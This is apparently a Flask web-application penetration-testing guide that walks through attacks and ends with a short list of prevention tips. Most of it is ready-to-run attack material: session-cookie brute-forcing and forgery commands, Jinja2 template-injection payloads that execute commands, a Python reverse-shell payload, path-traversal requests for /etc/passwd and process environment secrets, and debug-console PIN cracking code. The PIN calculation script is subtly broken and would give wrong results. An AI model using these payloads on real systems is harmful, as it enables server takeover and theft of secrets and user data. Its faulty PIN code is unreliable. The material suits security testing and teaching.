# Complete Methodology for Flask Application Security Testing


---

## Table of Contents

1. [Understanding Flask's Architecture](#understanding-flasks-architecture)
2. [Session Cookie Attacks](#session-cookie-attacks)
3. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
4. [Debug Mode Exploitation](#debug-mode-exploitation)
5. [Path Traversal in Flask](#path-traversal-in-flask)
6. [Authorization Bypass](#authorization-bypass)
7. [Complete Testing Workflow](#complete-testing-workflow)
8. [Tools Reference](#tools-reference)

---

## Understanding Flask's Architecture

Before diving into exploitation, it's important to understand how Flask handles sessions and templates.

### How Flask Sessions Work

Flask uses client-side sessions by default. This means session data is stored in the cookie itself, not on the server. The cookie is **signed** but **not encrypted** . This is a critical distinction - an attacker can read the session contents, but cannot modify them without knowing the secret key used for signing.

```
Session Cookie Structure: [payload].[timestamp].[signature]

Where:
- payload: Base64-encoded session data (potentially zlib compressed)
- timestamp: 31-bit Unix epoch
- signature: HMAC-SHA1 hash of payload + timestamp + secret
```

### The Secret Key's Role

The `SECRET_KEY` in Flask is used for:
- Signing session cookies
- Generating CSRF tokens
- Cryptographic signatures for various extensions

If an attacker discovers this key, they can forge valid session cookies and impersonate any user .

---

## Session Cookie Attacks

### Methodology Overview

Session cookie attacks follow a three-stage process:
1. **Capture** - Obtain a valid session cookie from the target application
2. **Decode** - View the session contents to understand the data structure
3. **Forge** - Either brute-force the secret key or use a known key to create malicious sessions

### Step 1: Capturing Session Cookies

Session cookies can be captured using:
- **Burp Suite** - Intercept HTTP requests and look for the `Cookie` header containing `session=`
- **Browser Developer Tools** - Application > Storage > Cookies
- **Browser Extensions** - EditThisCookie, Cookie-Editor

The default Flask session cookie name is simply `"session"` .

### Step 2: Decoding Session Cookies

Because Flask cookies are signed but not encrypted, you can decode them locally to view their contents .

**Using Flask-Unsign:**

```bash
# Basic decode
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'

# Auto-fetch from server
flask-unsign --decode --server 'https://target.com/login'
```

The decoded output reveals the session structure. A typical result might look like:
```python
{'logged_in': False, 'user_id': 123, 'role': 'user'}
```

**Manual Decoding with Python:**

```python
import base64
import zlib
import json

cookie = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJhZG1pbiJ9.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8"
payload_part = cookie.split('.')[0]

# Add padding if needed
padding = 4 - (len(payload_part) % 4)
if padding != 4:
    payload_part += '=' * padding

decoded = base64.urlsafe_b64decode(payload_part)

# Attempt decompression (sometimes used for large sessions)
try:
    decompressed = zlib.decompress(decoded)
    print(decompressed.decode('utf-8'))
except:
    print(decoded.decode('utf-8'))
```

### Step 3: Brute-Forcing the Secret Key

Once you have a valid session cookie, you can attempt to brute-force the server's secret key. If the secret is weak or default, this will succeed .

```bash
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8' --wordlist /usr/share/wordlists/rockyou.txt
```

Common weak secret keys to test manually:
- `secret`, `secretkey`, `password`, `changeme`
- `development`, `devkey`, `supersecret`
- `mysecret`, `secret123`, `key`

### Step 4: Session Manipulation

After obtaining the secret key, you can craft your own session data :

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'user_id': 1, 'role': 'admin'}" --secret 'CHANGEME'
```

**Important:** If the target uses an older version of Flask or itsdangerous, you may need the `--legacy` flag for compatibility with older timestamp generation algorithms .

### Real-World Example: Privilege Escalation via Session Forgery

**Scenario:** An e-commerce platform used a weak secret key "secretkey123" in production.

**Exploitation steps:**
1. Attacker registers a regular user account and captures the session cookie
2. Decodes the cookie to find structure: `{"user_id": "15432", "role": "customer"}`
3. Brute-forces the secret key using flask-unsign (takes 30 seconds with rockyou.txt)
4. Creates a new session: `{"user_id": "1", "role": "admin"}`
5. Accesses admin panel and extracts customer PII and credit card data

**Impact:** 500,000 user records compromised.

---

## Server-Side Template Injection (SSTI)

### Understanding the Vulnerability

SSTI occurs when user input is directly embedded into a template and then rendered by the template engine. Flask uses Jinja2 as its default templating engine. When user input is passed to `render_template_string()` instead of using properly parameterized templates, an attacker can inject template syntax that gets evaluated on the server .

**Vulnerable Code Example:**

```python
@app.route('/render', methods=['POST'])
def vulnerable():
    user_template = request.form.get('template', '')
    # DANGEROUS: User input directly rendered as a template
    rendered = render_template_string(user_template)
    return render_template('result.html', output=rendered)
```

**Safe Code:**

```python
@app.route('/render', methods=['POST'])
def safe():
    user_input = request.form.get('template', '')
    # SAFE: User input passed as context variable, not as template
    return render_template('page.html', content=user_input)
```

### Methodology for SSTI Detection

**Step 1: Identify Template Injection Points**

Test any input that gets reflected in output, especially:
- Search fields
- URL parameters
- Form inputs
- HTTP headers
- User profile fields

**Step 2: Basic Detection Payloads**

Start with simple mathematical expressions that the template engine will evaluate :

```python
{{7*7}}          # Returns 49 - Confirms Jinja2/Django engine
${7*7}           # Returns 49 - Alternative syntax (Twig, Freemarker)
{{7*'7'}}        # Returns 7777777 - String multiplication
{{config}}       # Returns Flask config - IMMEDIATE HIGH-RISK INDICATOR
```

If `{{7*7}}` renders as `49` instead of the literal string, SSTI is confirmed .

**Step 3: Information Gathering**

Once SSTI is confirmed, extract valuable information:

```python
# View application configuration (may contain secrets)
{{config}}
{{config.items()}}

# Examine request details
{{request}}
{{request.environ}}
{{request.headers}}
{{request.cookies}}

# View session data
{{session}}
{{session.items()}}
```

### Exploitation: From SSTI to RCE

**Step 4: Enumerate Available Classes**

Jinja2 provides access to Python's object hierarchy. The path to code execution typically follows the inheritance chain :

```python
# Get the string class, then its parent (object), then all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}
```

This returns a list of all Python classes available. Look for `subprocess.Popen` or `os._wrap_close` - these allow command execution.

**Step 5: Locate the Popen Class**

The index of `subprocess.Popen` varies by Python version:
- Python 3.6: Around index 400-500
- Python 3.8: Around index 500-600
- Python 3.10: Around index 600-700

To find it automatically, use a loop:

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'Popen' %}
{{ c('id', shell=True, stdout=-1).communicate() }}
{% endif %}
{% endfor %}
```

**Step 6: Execute Commands**

Once you have the correct index, execute system commands :

```python
# Replace <index> with the actual position of subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('id', shell=True, stdout=-1).communicate()[0].strip() }}
```

**Step 7: Establish a Reverse Shell**

For full server access, use a reverse shell payload :

```bash
# First, set up listener on your machine
nc -lvnp 4444
```

```python
# Inject this payload through the SSTI vulnerability
{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR-IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &', shell=True) }}
```

### Real-World Example: Bug Bounty SSTI to RCE

**Target:** Marketing platform with contact form functionality
**Vulnerable endpoint:** `/email?name=parameter`

**Exploitation chain:**
1. Attacker discovers that the `name` parameter is rendered in an email template
2. Tests with `{{7*7}}` - response shows `49`
3. Dumps config with `{{config}}` - finds `SECRET_KEY` exposed
4. Enumerates subclasses to find Popen at index 458
5. Executes `whoami` to confirm RCE
6. Deploys reverse shell using the Python payload
7. Accesses internal network and extracts source code

**Payout:** $15,000

### SSTI Filter Bypass Techniques

If the application filters certain characters, use these bypasses:

```python
# Bypass underscore filtering using attr()
{{request|attr('__class__')}}

# Bypass dot notation using brackets
{{request['__class__']}}

# Bypass quotes using request parameters
{{request|attr(request.args.x)}}&x=__class__

# Hex encoding for underscores
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## Debug Mode Exploitation

### Identifying Debug Mode

Flask applications running with `debug=True` expose the Werkzeug interactive debugger. This is extremely dangerous in production .

**Indicators of debug mode:**
- Server header shows `Werkzeug` with version
- Error pages include an interactive console button
- The `/console` endpoint returns HTTP 200
- Exception pages show full stack traces with local variables

**Detection command:**
```bash
curl -I https://target.com/404
# Look for: Server: Werkzeug/2.0.1 Python/3.9.0
```

### The PIN Protection Mechanism

The Werkzeug debugger is protected by a PIN code. This PIN is generated deterministically from system values :
- Username running the Flask process
- Flask module name (typically "flask.app")
- Application name (typically "Flask")
- Path to Flask's app.py file
- MAC address of a network interface
- Machine ID from `/etc/machine-id` or `/var/lib/dbus/machine-id`

### Obtaining PIN Components via LFI

If you have arbitrary file read (through SSTI or path traversal), you can read the files needed to calculate the PIN :

```python
# Read these files through the vulnerability:
/etc/machine-id                    # System machine ID
/proc/sys/kernel/random/boot_id    # Alternative machine ID
/sys/class/net/eth0/address        # MAC address
/proc/self/environ                 # Username and environment
/proc/self/status                  # Process user ID
```

### PIN Calculation Script

```python
import hashlib
from itertools import chain

# Values obtained from file reads
probably_public_bits = [
    'www-data',                                    # username
    'flask.app',                                   # modname
    'Flask',                                       # app name
    '/usr/local/lib/python3.8/dist-packages/flask/app.py'  # flask path
]

private_bits = [
    '2485377892354',                               # MAC as decimal
    'c71bcb2b-2b2b-4b2b-8b2b-2b2b2b2b2b2b'        # machine-id
]

def generate_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'pinsalt')
    
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
    return f"{num[:3]}-{num[3:6]}-{num[6:9]}"

print(generate_pin(probably_public_bits, private_bits))
```

**Converting MAC address to decimal:**
```python
mac = "02:42:ac:11:00:02"
decimal_mac = int(mac.replace(':', ''), 16)
print(decimal_mac)  # Output: 2485377892354
```

### Accessing the Debug Console

Once you have the PIN, access the console at `/console` and enter the PIN. You then have full Python execution capability on the server .

### Real-World Example: CTF Debug Mode Exploitation

**Challenge:** "Meowy" from Nullcon Goa HackIM 2026 

The application had an SSRF vulnerability allowing file reads. The team discovered:
- Debug mode was enabled but restricted to localhost
- They could read `/etc/machine-id` and `/sys/class/net/eth0/address` via SSRF
- Using these values, they calculated the Werkzeug PIN: `447-653-294`
- They used the `gopher://` protocol to bypass localhost restrictions and inject a raw HTTP request to `/console` with the calculated PIN
- Successfully executed `/readflag` to obtain the flag

### Automated Debug Console Exploitation

For automated exploitation, use the `wconsole-extractor` library :

```python
from wconsole_extractor import WConsoleExtractor
import requests

def leak_file(filename):
    # Implement your arbitrary file read
    r = requests.get(f"http://target.com/lfi?file={filename}")
    return r.text if r.status_code == 200 else ""

extractor = WConsoleExtractor(
    target="http://target.com",
    leak_function=leak_file
)

print(f"PIN: {extractor.pin_code}")
extractor.shell()  # Opens interactive shell on target
```

---

## Path Traversal in Flask

### Understanding the Vulnerability

Flask applications using `send_from_directory()` or `send_file()` without proper path sanitization can be vulnerable to path traversal attacks .

**Vulnerable Code Example:**
```python
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_from_directory('static/files', filename)
```

### Detection and Exploitation

**Test with standard traversal:**
```bash
curl "https://target.com/download?file=../../../etc/passwd"
```

If filtered, try encoded variants :
```bash
# URL encoded dot-dot-slash
curl "https://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"

# Double URL encoding
curl "https://target.com/download?file=..%252f..%252f..%252fetc%252fpasswd"

# Windows-style separators (even on Linux)
curl "https://target.com/download?file=..%5c..%5c..%5cetc%5cpasswd"
```

### Real-World Example: Path Traversal via Backslash Encoding

**Vulnerable application:** A Flask app simulating Windows path behavior using `ntpath` 

**The vulnerability:** The application filtered `../` but not `..\` (backslash). When `%5c` (URL-encoded backslash) was used, it bypassed the filter.

**Exploitation:**
```bash
# This bypassed the filter and read /etc/passwd
curl http://localhost:8000/%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
```

**Further exploitation - reading source code:**
```bash
curl http://localhost:8000/%2e%2e%5c%2e%2e%5capp%5capp.py
```

**Extracting environment variables:**
```bash
curl -s http://localhost:8000/%2e%2e%5c%2e%2e%5c%2e%2e%5cproc%5cself%5cenviron | tr '\0' '\n'
```

This revealed `APP_SECRET=ce9fbd88ac4eec98482b6aaf623adee54060b1ef477c677437a1982fbda0e4ac` - the application's secret key.

**Impact:** Full application compromise, secret key theft, and potential for session forgery.

---

## Authorization Bypass

### Inconsistent Access Control

Flask applications sometimes implement authorization checks only on main routes but forget to protect sub-routes .

**Vulnerable Pattern (CVE-2025-55734):**

The application checks user role when accessing `/admin` but not when accessing sub-routes:
```python
# routes/adminPanel.py - HAS check
@admin_bp.route('/admin')
def admin_panel():
    if session.get('userRole') != 'admin':
        return "Unauthorized", 403
    return render_template('admin.html')

# routes/adminPanelPosts.py - MISSING check (VULNERABLE)
@admin_bp.route('/admin/posts')
def admin_posts():
    # No role check!
    return render_template('posts.html')
```

### Exploitation

Simply access the unprotected sub-routes directly:
```bash
curl https://target.com/admin/posts
curl https://target.com/admin/comments
curl https://target.com/adminpanel/posts
```

### Testing Methodology

1. Map all administrative endpoints by spidering or directory brute-forcing
2. Test each endpoint with an unauthenticated or low-privilege session
3. Compare responses - if any admin functions are accessible, the vulnerability exists
4. Document the inconsistent access control

---

## Complete Testing Workflow

### Phase 1: Reconnaissance

```bash
# Identify Flask application
curl -I https://target.com/ | grep -i "server\|werkzeug"

# Check for debug indicators
curl https://target.com/404 | grep -i "debug\|werkzeug"

# Test for session cookie exposure
curl -c cookies.txt https://target.com/login
cat cookies.txt | grep session
```

### Phase 2: Session Analysis

```bash
# Decode session cookie
flask-unsign --decode --cookie 'session_cookie_here'

# Attempt brute force
flask-unsign --unsign --cookie 'session_cookie' --wordlist wordlist.txt
```

### Phase 3: SSTI Testing

1. Identify all input parameters
2. Test with `{{7*7}}` and watch for `49` in response
3. Test with `{{config}}` to confirm
4. Attempt class enumeration and RCE

### Phase 4: Debug Mode Exploitation (if detected)

1. Access `/console` - note if PIN is required
2. Use SSTI or path traversal to read:
   - `/etc/machine-id`
   - `/sys/class/net/eth0/address`
   - `/proc/self/environ`
3. Calculate PIN using the script
4. Access debug console with PIN
5. Execute Python code for RCE

### Phase 5: Authorization Testing

1. Map all routes (use dirb, gobuster, or Burp Suite Spider)
2. Attempt to access admin endpoints without proper authentication
3. Check for inconsistent access control on sub-routes

### Phase 6: Path Traversal Testing

1. Test all file download/upload endpoints
2. Use encoded variants of `../` and `..\`
3. Attempt to read sensitive files:
   - `/etc/passwd`
   - `/proc/self/environ`
   - `/app/app.py` (source code)
   - `/.env` (environment variables)

---

## Tools Reference

### Flask-Unsign

Purpose-built for Flask session cookie attacks .

```bash
# Installation
pip3 install flask-unsign[wordlist]

# Basic operations
flask-unsign --decode --cookie 'cookie_value'
flask-unsign --unsign --cookie 'cookie_value' --wordlist wordlist.txt
flask-unsign --sign --cookie "{'data': 'value'}" --secret 'found_key'

# Legacy mode for older Flask versions
flask-unsign --sign --cookie "{'data': 'value'}" --secret 'key' --legacy
```

### Burp Suite Configuration

Burp Suite is essential for intercepting and manipulating HTTP traffic .

**Setup for Flask Testing:**

1. Set up Burp Proxy to intercept all traffic
2. Use Repeater to manually test SSTI payloads
3. Use Intruder to brute-force session cookies or fuzz parameters
4. Look for session cookies in Proxy > HTTP History

**Burp Extensions for Flask:**
- **SSTImap Burp Plugin** - Automates SSTI detection
- **Flask-Unsign Integration** - Can be called from Burp's Python environment

### SSTImap

Automated SSTI detection and exploitation .

```bash
# Basic detection
python3 sstimap.py -u "https://target.com/page?name=*"

# POST request testing
python3 sstimap.py -u "https://target.com/" -d "param=*"

# Command execution
python3 sstimap.py -u "https://target.com/?name=*" --os-cmd "id"

# Interactive shell
python3 sstimap.py -u "https://target.com/?name=*" --shell
```

### Gobuster / Dirb

For endpoint discovery:

```bash
# Discover hidden Flask routes
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Look for Flask-specific paths
gobuster dir -u https://target.com -w flask-endpoints.txt
```

### WConsole-Extractor

Automated Werkzeug debug console exploitation .

```python
from wconsole_extractor import WConsoleExtractor

extractor = WConsoleExtractor(
    target="http://target.com",
    leak_function=your_file_read_function
)

print(f"PIN: {extractor.pin_code}")
extractor.shell()
```

---

## Quick Reference Cheatsheet

| Attack Vector | Test Payload | Success Indicator |
|---------------|--------------|--------------------|
| Session Decode | `flask-unsign --decode --cookie '...'` | Session data readable |
| Session Forge | `flask-unsign --sign --cookie "{'admin':1}" --secret 'key'` | Elevated privileges |
| SSTI Detection | `{{7*7}}` | Response shows `49` |
| SSTI Config Leak | `{{config}}` | Flask config displayed |
| SSTI RCE | `{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}` | Command output |
| Debug Detection | `curl /console` | HTTP 200 response |
| PIN Components | Read `/etc/machine-id`, MAC address, username | Values for calculation |
| Path Traversal | `../../../../etc/passwd` | File contents returned |
| Path Traversal (encoded) | `..%2f..%2f..%2fetc%2fpasswd` | File contents returned |

---

## Prevention Recommendations

For developers securing Flask applications:

1. **Secret Keys**: Use `secrets.token_urlsafe(32)` to generate strong keys; never hardcode them
2. **Debug Mode**: Never enable `debug=True` in production
3. **Templates**: Use `render_template()` with context variables, never `render_template_string()` with user input
4. **File Access**: Validate and normalize all file paths; use allowlists when possible
5. **Authorization**: Implement access controls consistently on all routes, including sub-routes
6. **Session Security**: Set `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_HTTPONLY=True`, and `SESSION_COOKIE_SAMESITE='Lax'`

---
